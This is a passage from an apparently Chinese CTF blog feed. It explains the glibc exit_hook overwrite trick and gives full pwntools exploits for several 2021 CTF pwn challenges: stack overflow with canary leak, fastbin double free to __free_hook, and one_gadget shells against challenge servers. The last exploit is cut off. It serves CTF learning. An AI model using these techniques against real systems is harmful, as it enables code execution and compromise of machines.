operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>ns<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">/* Protect against concurrent loads and unloads.  */</span><span class="token function">__rtld_lock_lock_recursive</span> <span class="token punctuation">(</span><span class="token function">GL</span><span class="token punctuation">(</span>dl_load_lock<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> nloaded <span class="token operator">=</span> <span class="token function">GL</span><span class="token punctuation">(</span>dl_ns<span class="token punctuation">)</span><span class="token punctuation">[</span>ns<span class="token punctuation">]</span><span class="token punctuation">.</span>_ns_nloaded<span class="token punctuation">;</span><span class="token comment">/* No need to do anything for empty namespaces or those used forauditing DSOs.  */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nloaded <span class="token operator">==</span> <span class="token number">0</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">SHARED</span></span><span class="token operator">||</span> <span class="token function">GL</span><span class="token punctuation">(</span>dl_ns<span class="token punctuation">)</span><span class="token punctuation">[</span>ns<span class="token punctuation">]</span><span class="token punctuation">.</span>_ns_loaded<span class="token operator">-></span>l_auditing <span class="token operator">!=</span> do_audit<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">)</span><span class="token function">__rtld_lock_unlock_recursive</span> <span class="token punctuation">(</span><span class="token function">GL</span><span class="token punctuation">(</span>dl_load_lock<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看8行和18行，发现是调用了 <code>__rtld_lock_lock_recursive</code> 和 <code>__rtld_lock_unlock_recursive</code> 。</p><p>在程序中寻找这两个函数：</p><p><img src="https://pic.imgdb.cn/item/61daad752ab3f51d91da14eb.png"></p><p>最终找到这两个函数在_rtld_global结构体里面。只要我们将其中一个指向one_gadgets，在CTF中，就可以拿到shell了。</p><p>接下来就是计算偏移了，发现在64位libc-2.23中，这两个指针在结构体中的偏移分别是3848和3856。为了方便，我们可以直接记住这两个指针和libc的基地址之间的距离。 </p><p>在libc-2.23中<br><strong>exit_hook = libc_base+0x5f0040+3848</strong></p><p><strong>exit_hook = libc_base+0x5f0040+3856</strong></p><p>在libc-2.27中</p><p><strong>exit_hook = libc_base+0x619060+3840</strong></p><p><strong>exit_hook = libc_base+0x619060+3848</strong></p><p>这样一来，只要知道libc版本和任意地址的写，我们可以直接写这个指针，执行exit后就可以拿到shell了。</p><p>其实不用非要执行exit，就程序正常返回也可以执行到这里</p><h2 id="长安战”疫“-pwn3"><a href="#长安战”疫“-pwn3" class="headerlink" title="长安战”疫“ pwn3"></a>长安战”疫“ pwn3</h2><p>题目设计了一个游戏，通过strcmp的<code>\x00</code>字符覆盖size来构造很大leavel通过检查，之后就可以修改任意地址8字节</p><p>这个遇到的问题就是任意修改8字节之后程序就会运行<code>exit(0)</code>,所以这里我们需要修改exit_hook来覆盖为ogg拿到shell</p><p>完整exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>local <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"113.201.14.253"</span><span class="token punctuation">,</span><span class="token string">"16033"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Give me a character level :"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leavelup</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Give me another level :"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">startgame</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>leavelup<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>leavelup<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x99</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>startgame<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Here's your reward: "</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span> addr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>puts_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>exit_hook <span class="token operator">=</span> libc_addr<span class="token operator">+</span><span class="token number">0x5f0040</span><span class="token operator">+</span><span class="token number">3848</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"your name:"</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>exit_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"e made for you!"</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_addr <span class="token operator">+</span> <span class="token number">0xf1247</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x45226 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4527a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf03a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1247 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span><span class="token comment"># flag&#123;3901afdc7f79dedfdb062a241eb3a575&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> exit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MTCTF2021</title>
      <link href="//post/wp-%E7%BE%8E%E5%9B%A2CTF2021.html"/>
      <url>//post/wp-%E7%BE%8E%E5%9B%A2CTF2021.html</url>
      
        <content type="html"><![CDATA[<h1 id="WP-美团CTF2021初赛"><a href="#WP-美团CTF2021初赛" class="headerlink" title="[WP]美团CTF2021初赛"></a>[WP]美团CTF2021初赛</h1><p>很可惜没进决赛,还是水平太差QwQ</p><span id="more"></span><h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>可以控制rbp和ret的简单栈溢出,没开启PIE</p><p>一开始输入name输入25字节带出canary,接下来第一反应时往bss段上栈迁移,</p><p>但是ayoung大爹注意到返回到程序段上的printf(“%s”,arg1);处,控制rbp的值之后可以做到任意地址泄露</p><p>只要泄露got表就得到libc,然后返回到onegadget就能getshell</p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Author : ayoung</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># r = process('./babyrop')</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'123.56.122.14'</span><span class="token punctuation">,</span><span class="token number">45327</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babyrop'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token number">4196782</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What your name?'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">25</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">25</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">+</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'challenge'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span>prdi_r <span class="token operator">=</span> <span class="token number">0x0000000000400913</span>prsi_pr15_r <span class="token operator">=</span> <span class="token number">0x0000000000400911</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000400759</span>bssaddr <span class="token operator">=</span> <span class="token number">0x601000</span><span class="token operator">+</span><span class="token number">0x200</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601010</span><span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400818</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Hello, '</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'challenge'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bssaddr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x4f3d5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="bookshop"><a href="#bookshop" class="headerlink" title="bookshop"></a>bookshop</h2><p>glibc-2.31的题,使用luckynum限制了整个程序只能申请一个大小的chunk,</p><p>同时没有edit功能,但是存在UAF漏洞</p><p>利用思路是利用fastbin的doublefree构造任意地址写,</p><p>同时考虑到fastbin没法泄露libc地址,但是scanf函数再输入很大一堆数据的时候会在heap上开辟缓冲区,</p><p>这样只要scanf开辟的缓冲区足够大,就可以申请一个largebin大小的chunk,</p><p>同时每当程序申请largebin大小的chunk的时候,会调用malloc_consolidate使得fastbin合并</p><p>这样我们首先在fastbin的大小填满tcahce,然后再在fastbin触发合并,泄露libc,doublefree任意地址写free_hook即可getshell</p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bookshop"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>loacl <span class="token operator">=</span> <span class="token number">0</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">if</span> loacl<span class="token punctuation">:</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bookshop"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>  p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"123.57.131.167"</span><span class="token punctuation">,</span><span class="token string">"39789"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">loginfo</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>  log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token string">" ==> "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>  cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Write something in the Book"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>  cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"want to take out from you bag?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>  cmd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Which Book do you want to read?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"number?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  add<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  free<span class="token punctuation">(</span>i<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"0"</span><span class="token operator">*</span><span class="token number">0x500</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>loginfo<span class="token punctuation">(</span><span class="token string">"addr"</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">464</span>loginfo<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  add<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;81d181ac-d4d5-4423-859b-1d353821f757&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="blindbox"><a href="#blindbox" class="headerlink" title="blindbox"></a>blindbox</h2><p>限制了3个luckynum,也就是三个size大小的chunk,只能show一次而且不能有<code>&#39;\x7f&#39;</code>,本意应该是不让泄露libc地址,但是libc地址随机化有几率是以<code>&#39;\x7e&#39;</code>开头,从而直接绕过然后拿到system地址.pay功能实现getshell</p><blockquote><p>这题本意应该是想考tcache stash unlink,但是本菜鸡比赛的时候学了半天没学会(</p></blockquote><p>exp:</p><blockquote><p>赛后本地复现的QwQ</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token comment"># context.log_level = 'debug'</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./Blindbox"</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">choose</span><span class="token punctuation">(</span>num_idx<span class="token punctuation">,</span>box_idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num_idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Blindbox(1-3):"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>box_idx<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">drop</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Which index do you want to drop?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Which Blindbox do you want to change?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Which Blindbox do you want to open?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your name:"</span><span class="token punctuation">,</span><span class="token string">"Mark"</span><span class="token punctuation">)</span>  num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x233</span><span class="token punctuation">]</span> <span class="token comment"># size</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"The first lucky number?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"The second lucky number?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"The third lucky number?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  choose<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>  choose<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  choose<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>  drop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  drop<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  drop<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  choose<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>  choose<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  